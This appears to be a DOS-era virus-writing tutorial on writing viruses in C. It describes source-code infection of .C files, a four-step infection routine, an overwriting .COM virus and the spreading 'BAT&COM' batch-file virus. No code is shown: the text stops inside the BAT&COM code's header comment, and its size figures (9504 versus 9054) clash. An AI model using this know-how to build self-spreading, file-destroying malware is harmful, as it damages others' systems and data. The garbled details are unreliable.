        Upper-level languages, such as Basic, C, and a multitude of
    others, are where most programmers these days feel at home.  They
    provide users with an amazing amount of built-in functionality,
    and allow the programmer to escape from having to deal with the
    machine that is being programmed on, and instead focus on the
    details of the program design.  For viruses, this makes them easy
    languages to start in, but there are several obstacles.  The first
    is that most upper-level languages simply were not made to program
    at a base systems level, even in C this is not easy.  As a result,
    most viruses that are in this genre are primitive [usually
    overwriting] in their reproduction mechanism, although their
    activation routines can be impressive.  Another really important
    disadvantage is that high-level languages often create files that
    are at the very LEAST 10k and often much higher - not very
    efficient for a virus.  With this overhead, a memory-resident
    virus is impractical as it would usually be noticed by the user
    when a rather large chunk of memory disappears for no apparent
    reason.

         Another possibility with high-level languages, however, is a
    source-code virus.  This kind of virus is quite rare (to the best
    of my knowledge) but could be very effective.  What a source-code
    virus does, in short, is search for another source file in the
    same language - for example, it might search for all files with a
    &quot;.C&quot; extension for C.  It would then add its own source code to
    the file (often by way of &quot;including&quot; a header with the routines
    and placing a call to it in main()) which would execute once the
    program was compiled.  After compilation, the virus would be more
    or less hidden inside the application, and would be dormant until
    it found another &quot;.C&quot; file.  The only documented case of this that
    I know of is Mark Ludwig's virus presented in Computer Virus
    Developments Quarterly, Volume 1, Number 2.

         At any rate, all of these viruses have some basic steps in
    common. They are:

            1) Find a file to infect, be it an executable, source,
               or whatever (If none found, go to step 3)
            2) Place virus in file.
            3) Decide if any activation routines are met and, if so,
               activate.
            4) Return to host or terminate and return to DOS.

         For overwriting viruses, the implementation of these is quite
    simple. The only problem with these viruses is that they totally
    destroy any program that they infect, making them quite obvious.
    The only way to cure these is to find all of the infected files
    and delete them, restoring them from backups.  The following virus
    is an extremely simple overwriting virus written in C.  It will
    infect all .COM files within the current directory, destroying
    them completely.  As it infects each file, it will print
    &quot;Infecting [FILENAME]&quot; on the screen as a warning.  If you compile
    it to test it, compile it once, then EXE2BIN it and check the
    resultant size.  If it does not equal 9504 bytes, change the line
    &quot;x=9054;&quot; to the appropriate size value.  Do be careful with this
    virus, because while it is a primitive one, it will destroy any
    .COM files that it hits.

         The next virus to be presented is also in C, but is quite a
    bit different in functioning than the last.  Instead of infecting
    executable files by overwriting them, it infects .BAT files by
    the directory.  When executed, BAT&amp;COM will first search one
    directory below the current for batch files.  If none are found,
    it will try the root directory, then finally the DOS directory.
    If it finds any batch files, it will infect all of the batches
    in the directory, then check to see if its file has already
    been put there.  If not, then it will create a file called
    BAT&amp;COM containing the virus.  On my setup, after EXE2BIN-ing
    the file, it came out around 10k. The virus code is as follows:

                        The BAT&amp;COM Virus in C

    - - - -----------------Start Code------------------------- - - -
    /*  This file is a high-level language virus of a different sort.
        It will search out batch files and, when found, place a copy
        of itself in the directory with the batch file while adding
        instructions in the BAT to execute this new file.  In this way,
        it will spread each time an &quot;infected&quot; batch is run.
        Disinfection is done simply by deleting all of the BAT&amp;COM.COM
        files and removing the commands from batch files that ruin
        them.  This one is NOT confined to the current directory,
        so make sure it is on an isolated machine and be sure to
        clean up any infections. PLEASE DO NOT RELEASE!
